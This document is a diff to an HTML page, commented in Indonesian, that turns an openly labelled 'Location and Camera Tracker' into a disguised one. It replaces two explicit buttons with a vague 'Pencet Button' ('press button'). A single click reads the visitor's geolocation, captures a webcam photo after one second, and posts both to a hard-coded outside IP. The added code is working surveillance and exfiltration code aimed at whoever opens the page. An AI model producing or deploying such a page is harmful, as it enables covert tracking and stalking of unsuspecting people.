@@ -4,51 +4,71 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Location and Camera Tracker</title>
-    <script>
-        function sendLocation() {
-            navigator.geolocation.getCurrentPosition((position) => {
-                const lat = position.coords.latitude;
-                const lng = position.coords.longitude;
-
-                fetch('http://180.241.180.188:3000/location', { // Ganti dengan IP Anda
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ latitude: lat, longitude: lng })
-                })
-                .then(response => response.text())
-                .then(data => console.log(data))
-                .catch(error => console.error('Error:', error));
-            }, (error) => {
-                console.error('Error getting location:', error);
-            });
-        }
-
-        function sendPhoto() {
-            const input = document.createElement('input');
-            input.type = 'file';
-            input.accept = 'image/*';
-            input.onchange = async () => {
-                const file = input.files[0];
-                const formData = new FormData();
-                formData.append('photo', file);
-
-                fetch('http://180.241.180.188:3000/upload', { // Ganti dengan IP Anda
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => response.text())
-                .then(data => console.log(data))
-                .catch(error => console.error('Error:', error));
-            };
-            input.click();
-        }
-    </script>
 </head>
 <body>
-    <h1>Location and Camera Tracker</h1>
-    <button onclick="sendLocation()">Send Location</button>
-    <button onclick="sendPhoto()">Send Photo</button>
+    <h1>Location</h1>
+    <button id="trackButton">Pencet Button</button>
+
+    <script>
+        document.getElementById('trackButton').onclick = async () => {
+            // Mengambil lokasi
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    // Mengambil foto
+                    const photo = await takePhoto();
+
+                    // Kirim data ke server
+                    const formData = new FormData();
+                    formData.append('latitude', latitude);
+                    formData.append('longitude', longitude);
+                    formData.append('photo', photo);
+
+                    fetch('http://180.241.180.188:3000/submit', {
+                        method: 'POST',
+                        body: formData
+                    }).then(response => response.json())
+                      .then(data => {
+                          console.log(data);
+                      }).catch(error => console.error('Error:', error));
+                });
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        };
+
+        // Fungsi untuk mengambil foto
+        async function takePhoto() {
+            return new Promise((resolve, reject) => {
+                const video = document.createElement('video');
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+
+                // Akses kamera
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        video.srcObject = stream;
+                        video.play();
+                        
+                        // Ambil gambar setelah video mulai bermain
+                        video.addEventListener('loadedmetadata', () => {
+                            setTimeout(() => {
+                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                video.pause();
+                                stream.getTracks().forEach(track => track.stop()); // Hentikan kamera
+
+                                canvas.toBlob(blob => {
+                                    const file = new File([blob], 'photo.jpg', { type: 'image/jpeg' });
+                                    resolve(file);
+                                }, 'image/jpeg');
+                            }, 1000); // Ambil foto setelah 1 detik
+                        });
+                    })
+                    .catch(error => reject(error));
+            });
+        }
+    </script>
 </body>
-</html>
+</html
